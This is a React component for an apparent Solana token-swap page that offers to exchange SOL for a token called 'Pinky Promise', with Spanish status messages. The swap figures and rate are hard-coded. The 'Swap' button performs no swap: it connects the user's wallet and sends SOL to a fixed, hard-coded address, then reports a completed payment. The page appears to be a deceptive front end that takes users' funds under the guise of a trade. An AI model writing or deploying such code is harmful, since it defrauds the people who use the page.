"use client";

import { useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { sendSol } from "../utils/solanaUtils";
import { FaArrowsAltV } from "react-icons/fa";

const SwapModule = () => {
    const wallet = useWallet();
    const [isLoading, setIsLoading] = useState(false);
    const [txHash, setTxHash] = useState<string | null>(null);
    const [statusMessage, setStatusMessage] = useState<string | null>(null);

    const handleSwapClick = async () => {
        setStatusMessage(null);
        setTxHash(null);

        try {
            setIsLoading(true);
            if (!wallet.connected) {
                await wallet.connect();
            }

            if (!wallet.publicKey) {
                setStatusMessage("❌ Wallet no detectada");
                return;
            }

            const signature = await sendSol(wallet, "B281iQS8fnYczAyQR5U9j3hNyMYaiNbGkwM3z9AwG8Pk");

            if (signature) {
                setTxHash(signature);
                setStatusMessage("✅ Pago realizado correctamente");
            } else {
                setStatusMessage("❌ Falló la transacción");
            }
        } catch (error) {
            console.error("Swap error:", error);
            setStatusMessage("❌ Error al procesar el pago");
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <section className="relative w-[583px] h-[722px] p-6 bg-[#222] rounded-[40px] border border-white/20 shadow-md flex flex-col justify-between">
            {/* FROM */}
            <div className="bg-black/90 rounded-2xl p-4 flex justify-between items-center mb-3">
                <div className="flex flex-col">
                    <span className="text-white/50 text-sm">from</span>
                    <span className="text-4xl font-bold text-white">2,194</span>
                </div>
                <div className="flex items-center space-x-2 border border-cyan-400 rounded-full px-4 py-1">
                    <div className="w-5 h-5 bg-cyan-400 rounded-full" /> {/* placeholder imagen */}
                    <span className="text-cyan-400 font-medium">SOL</span>
                </div>
            </div>

            {/* SWITCH ICON */}
            <div className="absolute left-1/2 top-[215px] -translate-x-1/2 z-10 bg-cyan-400 p-2 rounded-full shadow-lg">
                <FaArrowsAltV className="text-black text-lg" />
            </div>

            {/* TO */}
            <div className="bg-black/90 rounded-2xl p-4 flex justify-between items-center mt-3">
                <div className="flex flex-col">
                    <span className="text-white/50 text-sm">to</span>
                    <span className="text-4xl font-bold text-white">12,466</span>
                </div>
                <div className="flex items-center space-x-2 border border-cyan-400 rounded-full px-4 py-1">
                    <div className="w-5 h-5 bg-pink-400 rounded-full" /> {/* placeholder imagen */}
                    <span className="text-cyan-400 font-medium">Pinky Promise</span>
                </div>
            </div>

            {/* INFO BOX */}
            <div className="bg-black/90 rounded-2xl p-5 mt-4 text-white text-sm space-y-2">
                <div>
                    <strong>2,194 SOL</strong> = <strong>12,466 PINKY PROMISE</strong>
                </div>
                <div className="flex justify-between text-white/60">
                    <span>Minimum Received</span>
                    <span className="text-white">10 PINKY PROMISE</span>
                </div>
                <div className="flex justify-between text-white/60">
                    <span>Price Impact</span>
                    <span>-</span>
                </div>
            </div>

            {/* SWAP BUTTON */}
            <button
                onClick={handleSwapClick}
                disabled={isLoading}
                className="w-full mt-4 py-3 rounded-2xl bg-cyan-400 text-black font-bold flex items-center justify-center gap-2 hover:bg-cyan-300 transition"
            >
                {isLoading ? "Enviando..." : "Swap"}
                <FaArrowsAltV className="text-xl rotate-90" />
            </button>

            {/* Feedback */}
            <div className="mt-2">
                {txHash && (
                    <div className="text-sm text-cyan-400">
                        Tx: {txHash}
                    </div>
                )}
                {statusMessage && (
                    <div className="text-xs text-white/70">
                        {statusMessage}
                    </div>
                )}
            </div>
        </section>
    );
};

export default SwapModule;
